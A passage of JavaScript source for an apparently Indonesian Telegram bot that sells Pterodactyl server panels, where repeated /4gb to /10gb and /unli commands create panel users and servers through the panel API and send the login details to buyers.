          dedicated_ip: false,
          port_range: []
        }
      })
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(chatId, `BERIKUT DATA PANEL ANDA
ID: ${server.id}
NAMA: ${username}
EMAIL: ${email}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%`);

    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

HERE'S YOUR PANEL DATA ⤵️
🚩 Username : ${user.username}
🚩 Password : ${password}
🚩 Login : ${domain}  
==============================
Jangan Lupa Bilang Done Jika Sudah Di Cek
==============================
➡️ Rules : 

• Jangan Curi Sc
• Jangan Buka Panel Orang
• Jangan Ddos Server
• Kalo jualan sensor domainnya
• Jangan Bagi² Panel Free
• Jangan Jualan AdminP Kecuali Pt Gw !!
• Dilirang Keras Pasang Sc/Bot DDOS
==============================
THANKS FOR BUYING AT RelixOfficial😁✌ ` 
        });
      bot.sendMessage(chatId, 'Data panel berhasil dikirim ke ID Telegram yang dimaksud.');
    }
  } else {
    bot.sendMessage(chatId, 'Gagal membuat data panel. Silakan coba lagi.');
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 4gb
bot.onText(/\/4gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const text = match[1];
  
const userData = getUserData(userId);
   if (!userData.isReseller && !userData.isAdminReseller) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium Atau Chat Tidak Terdaftar!!, Hubungi Admi...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/Oficiallz' }
          ]
        ]
      }
    });
    return;
  }
  const t = text.split(',');
  if (t.length < 2) {
    bot.sendMessage(chatId, 'Invalid format. Usage: /4gb namapanel,idtele');
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + '4gb';
  const egg = settings.eggs;
  const loc = settings.loc;
  const nests = settings.nests;
  const memo = '4200';
  const cpu = '150';
  const disk = '4200';
  const email = `${username}@Relix.com`;
  const akunlo = settings.pp;
  const password = generateRandomPassword();
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: 'en',
        password: password
      })
    });
    const data = await response.json();
    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }
    user = data.attributes;
    const responses = await fetch(`${domain}/api/application/nests/${nests}/eggs/${egg}`, {
method: 'GET',
headers: {
'Accept': 'application/json',
'Content-Type': 'application/json',
'Authorization': `Bearer ${plta}`
}
})
const data4 = await responses.json();
const startup_cmd = data4.attributes.startup
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name: name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_18',
        startup: startup_cmd,
        environment: {
          INST: 'npm',
          USER_UPLOAD: '0',
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 0
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(chatId, `BERIKUT DATA PANEL ANDA
ID: ${server.id}
NAMA: ${username}
EMAIL: ${email}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%`);
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

HERE'S YOUR PANEL DATA ⤵️
🚩 Username : ${user.username}
🚩 Password : ${password}
🚩 Login : ${domain}  
==============================
Jangan Lupa Bilang Done Jika Sudah Di Cek
==============================
➡️ Rules : 

• Jangan Curi Sc
• Jangan Buka Panel Orang
• Jangan Ddos Server
• Kalo jualan sensor domainnya
• Jangan Bagi² Panel Free
• Jangan Jualan AdminP Kecuali Pt Gw !!
• Dilirang Keras Pasang Sc/Bot DDOS
==============================
THANKS FOR BUYING AT RelixOfficial😁✌ ` 
        });
      bot.sendMessage(chatId, 'Data panel berhasil dikirim ke ID Telegram yang dimaksud.');
    }
  } else {
    bot.sendMessage(chatId, 'Gagal membuat data panel. Silakan coba lagi.');
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 5gb
bot.onText(/\/5gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const text = match[1];
  
const userData = getUserData(userId);
   if (!userData.isReseller && !userData.isAdminReseller) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium Atau Chat Tidak Terdaftar!!, Hubungi Admi...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/Oficiallz' }
          ]
        ]
      }
    });
    return;
  }
  const t = text.split(',');
  if (t.length < 2) {
    bot.sendMessage(chatId, 'Invalid format. Usage: /5gb namapanel,idtele');
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + '5gb';
  const egg = settings.eggs;
  const loc = settings.loc;
  const nests = settings.nests;
  const memo = '5358';
  const cpu = '200';
  const disk = '5358';
  const email = `${username}@Relix.com`;
  const akunlo = settings.pp;
  const password = generateRandomPassword();
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: 'en',
        password: password
      })
    });
    const data = await response.json();
    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }
    user = data.attributes;
    const responses = await fetch(`${domain}/api/application/nests/${nests}/eggs/${egg}`, {
method: 'GET',
headers: {
'Accept': 'application/json',
'Content-Type': 'application/json',
'Authorization': `Bearer ${plta}`
}
})
const data4 = await responses.json();
const startup_cmd = data4.attributes.startup
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name: name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_18',
        startup: startup_cmd,
        environment: {
          INST: 'npm',
          USER_UPLOAD: '0',
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 0
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(chatId, `BERIKUT DATA PANEL ANDA
ID: ${server.id}
NAMA: ${username}
EMAIL: ${email}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%`);
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

HERE'S YOUR PANEL DATA ⤵️
🚩 Username : ${user.username}
🚩 Password : ${password}
🚩 Login : ${domain}  
==============================
Jangan Lupa Bilang Done Jika Sudah Di Cek
==============================
➡️ Rules : 

• Jangan Curi Sc
• Jangan Buka Panel Orang
• Jangan Ddos Server
• Kalo jualan sensor domainnya
• Jangan Bagi² Panel Free
• Jangan Jualan AdminP Kecuali Pt Gw !!
• Dilirang Keras Pasang Sc/Bot DDOS
==============================
THANKS FOR BUYING AT RelixOfficial😁✌ ` 
        });
      bot.sendMessage(chatId, 'Data panel berhasil dikirim ke ID Telegram yang dimaksud.');
    }
  } else {
    bot.sendMessage(chatId, 'Gagal membuat data panel. Silakan coba lagi.');
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 6gb
bot.onText(/\/6gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const text = match[1];
  
const userData = getUserData(userId);
   if (!userData.isReseller && !userData.isAdminReseller) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium Atau Chat Tidak Terdaftar!!, Hubungi Admi...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/Oficiallz' }
          ]
        ]
      }
    });
    return;
  }
  const t = text.split(',');
  if (t.length < 2) {
    bot.sendMessage(chatId, 'Invalid format. Usage: /6gb namapanel,idtele');
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + '6gb';
  const egg = settings.eggs;
  const loc = settings.loc;
  const nests = settings.nests;
  const memo = '6248';
  const cpu = '230';
  const disk = '6248';
  const email = `${username}@Relix.com`;
  const akunlo = settings.pp;
  const password = generateRandomPassword();
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: 'en',
        password: password
      })
    });
    const data = await response.json();
    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }
    user = data.attributes;
    const responses = await fetch(`${domain}/api/application/nests/${nests}/eggs/${egg}`, {
method: 'GET',
headers: {
'Accept': 'application/json',
'Content-Type': 'application/json',
'Authorization': `Bearer ${plta}`
}
})
const data4 = await responses.json();
const startup_cmd = data4.attributes.startup
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name: name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_18',
        startup: startup_cmd,
        environment: {
          INST: 'npm',
          USER_UPLOAD: '0',
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 0
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(chatId, `BERIKUT DATA PANEL ANDA
ID: ${server.id}
NAMA: ${username}
EMAIL: ${email}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%`);
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

HERE'S YOUR PANEL DATA ⤵️
🚩 Username : ${user.username}
🚩 Password : ${password}
🚩 Login : ${domain}  
==============================
Jangan Lupa Bilang Done Jika Sudah Di Cek
==============================
➡️ Rules : 

• Jangan Curi Sc
• Jangan Buka Panel Orang
• Jangan Ddos Server
• Kalo jualan sensor domainnya
• Jangan Bagi² Panel Free
• Jangan Jualan AdminP Kecuali Pt Gw !!
• Dilirang Keras Pasang Sc/Bot DDOS
==============================
THANKS FOR BUYING AT RelixOfficial😁✌ ` 
        });
      bot.sendMessage(chatId, 'Data panel berhasil dikirim ke ID Telegram yang dimaksud.');
    }
  } else {
    bot.sendMessage(chatId, 'Gagal membuat data panel. Silakan coba lagi.');
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 7gb
bot.onText(/\/7gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const text = match[1];
  
const userData = getUserData(userId);
   if (!userData.isReseller && !userData.isAdminReseller) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium Atau Chat Tidak Terdaftar!!, Hubungi Admi...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/Oficiallz' }
          ]
        ]
      }
    });
    return;
  }
  const t = text.split(',');
  if (t.length < 2) {
    bot.sendMessage(chatId, 'Invalid format. Usage: /7gb namapanel,idtele');
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + '7gb';
  const egg = settings.eggs;
  const loc = settings.loc;
  const nests = settings.nests;
  const memo = '7248';
  const cpu = '300';
  const disk = '7248';
  const email = `${username}@Relix.com`;
  const akunlo = settings.pp;
  const password = generateRandomPassword();
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: 'en',
        password: password
      })
    });
    const data = await response.json();
    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }
    user = data.attributes;
    const responses = await fetch(`${domain}/api/application/nests/${nests}/eggs/${egg}`, {
method: 'GET',
headers: {
'Accept': 'application/json',
'Content-Type': 'application/json',
'Authorization': `Bearer ${plta}`
}
})
const data4 = await responses.json();
const startup_cmd = data4.attributes.startup
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name: name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_18',
        startup: startup_cmd,
        environment: {
          INST: 'npm',
          USER_UPLOAD: '0', 
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 0
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(chatId, `BERIKUT DATA PANEL ANDA
ID: ${server.id}
NAMA: ${username}
EMAIL: ${email}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%`);
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

HERE'S YOUR PANEL DATA ⤵️
🚩 Username : ${user.username}
🚩 Password : ${password}
🚩 Login : ${domain}  
==============================
Jangan Lupa Bilang Done Jika Sudah Di Cek
==============================
➡️ Rules : 

• Jangan Curi Sc
• Jangan Buka Panel Orang
• Jangan Ddos Server
• Kalo jualan sensor domainnya
• Jangan Bagi² Panel Free
• Jangan Jualan AdminP Kecuali Pt Gw !!
• Dilirang Keras Pasang Sc/Bot DDOS
==============================
THANKS FOR BUYING AT RelixOfficial😁✌ ` 
        });
      bot.sendMessage(chatId, 'Data panel berhasil dikirim ke ID Telegram yang dimaksud.');
    }
  } else {
    bot.sendMessage(chatId, 'Gagal membuat data panel. Silakan coba lagi.');
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 8gb
bot.onText(/\/8gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const text = match[1];
  
const userData = getUserData(userId);
   if (!userData.isReseller && !userData.isAdminReseller) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium Atau Chat Tidak Terdaftar!!, Hubungi Admi...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/Oficiallz' }
          ]
        ]
      }
    });
    return;
  }
  const t = text.split(',');
  if (t.length < 2) {
    bot.sendMessage(chatId, 'Invalid format. Usage: /8gb namapanel,idtele');
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + '8gb';
  const egg = settings.eggs;
  const loc = settings.loc;
  const nests = settings.nests;
  const memo = '8348';
  const cpu = '350';
  const disk = '8348';
  const email = `${username}@Relix.com`;
  const akunlo = settings.pp;
  const password = generateRandomPassword();
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: 'en',
        password: password
      })
    });
    const data = await response.json();
    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }
    user = data.attributes;
    const responses = await fetch(`${domain}/api/application/nests/${nests}/eggs/${egg}`, {
method: 'GET',
headers: {
'Accept': 'application/json',
'Content-Type': 'application/json',
'Authorization': `Bearer ${plta}`
}
})
const data4 = await responses.json();
const startup_cmd = data4.attributes.startup
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name: name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_18',
        startup: startup_cmd,
        environment: {
          INST: 'npm',
          USER_UPLOAD: '0',
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 0
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(chatId, `BERIKUT DATA PANEL ANDA
ID: ${server.id}
NAMA: ${username}
EMAIL: ${email}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%`);
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

HERE'S YOUR PANEL DATA ⤵️
🚩 Username : ${user.username}
🚩 Password : ${password}
🚩 Login : ${domain}  
==============================
Jangan Lupa Bilang Done Jika Sudah Di Cek
==============================
➡️ Rules : 

• Jangan Curi Sc
• Jangan Buka Panel Orang
• Jangan Ddos Server
• Kalo jualan sensor domainnya
• Jangan Bagi² Panel Free
• Jangan Jualan AdminP Kecuali Pt Gw !!
• Dilirang Keras Pasang Sc/Bot DDOS
==============================
THANKS FOR BUYING AT RelixOfficial😁✌ ` 
        });
      bot.sendMessage(chatId, 'Data panel berhasil dikirim ke ID Telegram yang dimaksud.');
      bot.sendMessage(chatId, 'Data panel berhasil dikirim ke ID Telegram yang dimaksud.');
    }
  } else {
    bot.sendMessage(chatId, 'Gagal membuat data panel. Silakan coba lagi.');
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 9gb
bot.onText(/\/9gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const text = match[1];
  
const userData = getUserData(userId);
   if (!userData.isReseller && !userData.isAdminReseller) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium Atau Chat Tidak Terdaftar!!, Hubungi Admi...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/Oficiallz' }
          ]
        ]
      }
    });
    return;
  }
  const t = text.split(',');
  if (t.length < 2) {
    bot.sendMessage(chatId, 'Invalid format. Usage: /9gb namapanel,idtele');
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + '9gb';
  const egg = settings.eggs;
  const loc = settings.loc;
  const nests = settings.nests;
  const memo = '9148';
  const cpu = '400';
  const disk = '9148';
  const email = `${username}@Relix.com`;
  const akunlo = settings.pp;
  const password = generateRandomPassword();
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: 'en',
        password: password
      })
    });
    const data = await response.json();
    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }
    user = data.attributes;
    const responses = await fetch(`${domain}/api/application/nests/${nests}/eggs/${egg}`, {
method: 'GET',
headers: {
'Accept': 'application/json',
'Content-Type': 'application/json',
'Authorization': `Bearer ${plta}`
}
})
const data4 = await responses.json();
const startup_cmd = data4.attributes.startup
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name: name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_18',
        startup: startup_cmd,
        environment: {
          INST: 'npm',
          USER_UPLOAD: '0',
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 0
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(chatId, `BERIKUT DATA PANEL ANDA
ID: ${server.id}
NAMA: ${username}
EMAIL: ${email}
MEMORY: ${server.limits.memory === 0 ? '11gb' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? '11gb' : server.limits.disk} MB
CPU: ${server.limits.cpu}%`);
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

HERE'S YOUR PANEL DATA ⤵️
🚩 Username : ${user.username}
🚩 Password : ${password}
🚩 Login : ${domain}  
==============================
Jangan Lupa Bilang Done Jika Sudah Di Cek
==============================
➡️ Rules : 

• Jangan Curi Sc
• Jangan Buka Panel Orang
• Jangan Ddos Server
• Kalo jualan sensor domainnya
• Jangan Bagi² Panel Free
• Jangan Jualan AdminP Kecuali Pt Gw !!
• Dilirang Keras Pasang Sc/Bot DDOS
==============================
THANKS FOR BUYING AT RelixOfficial😁✌ ` 
        });
      bot.sendMessage(chatId, 'Data panel berhasil dikirim ke ID Telegram yang dimaksud.');
    }
  } else {
    bot.sendMessage(chatId, 'Gagal membuat data panel. Silakan coba lagi.');
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 10gb
bot.onText(/\/10gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const text = match[1];
  
const userData = getUserData(userId);
   if (!userData.isReseller && !userData.isAdminReseller) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium.', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/Oficiallz' }
          ]
        ]
      }
    });
    return;
  }
  const t = text.split(',');
  if (t.length < 2) {
    bot.sendMessage(chatId, 'Invalid format. Usage: /10gb namapanel,idtele');
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + '10gb';
  const egg = settings.eggs;
  const loc = settings.loc;
  const nests = settings.nests;
  const memo = '10359';
  const cpu = '470';
  const disk = '10358';
  const email = `${username}@Relix.com`;
  const akunlo = settings.pp;
  const password = generateRandomPassword();
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: 'en',
        password: password
      })
    });
    const data = await response.json();
    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }
    user = data.attributes;
    const responses = await fetch(`${domain}/api/application/nests/${nests}/eggs/${egg}`, {
method: 'GET',
headers: {
'Accept': 'application/json',
'Content-Type': 'application/json',
'Authorization': `Bearer ${plta}`
}
})
const data4 = await responses.json();
const startup_cmd = data4.attributes.startup
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name: name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_18',
        startup: startup_cmd,
        environment: {
          INST: 'npm',
          USER_UPLOAD: '0',
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 0
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(chatId, `BERIKUT DATA PANEL ANDA
ID: ${server.id}
NAMA: ${username}
EMAIL: ${email}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%`);
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

HERE'S YOUR PANEL DATA ⤵️
🚩 Username : ${user.username}
🚩 Password : ${password}
🚩 Login : ${domain}  
==============================
Jangan Lupa Bilang Done Jika Sudah Di Cek
==============================
➡️ Rules : 

• Jangan Curi Sc
• Jangan Buka Panel Orang
• Jangan Ddos Server
• Kalo jualan sensor domainnya
• Jangan Bagi² Panel Free
• Jangan Jualan AdminP Kecuali Pt Gw !!
• Dilirang Keras Pasang Sc/Bot DDOS
==============================
THANKS FOR BUYING AT RelixOfficial😁✌ ` 
        });
      bot.sendMessage(chatId, 'Data panel berhasil dikirim ke ID Telegram yang dimaksud.');
    }
  } else {
    bot.sendMessage(chatId, 'Gagal membuat data panel. Silakan coba lagi.');
  }
});

// unli
bot.onText(/\/unli (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const text = match[1];

const userData = getUserData(userId);
   if (!userData.isReseller && !userData.isAdminReseller) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium Atau Chat Tidak Terdaftar!!, Hubungi Admi...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/Oficiallz' }
          ]
        ]
      }
    });
    return;
  }
  const t = text.split(',');
  if (t.length < 2) {
    bot.sendMessage(chatId, 'Invalid format. Usage: /unli namapanel,idtele');
    return;
  }
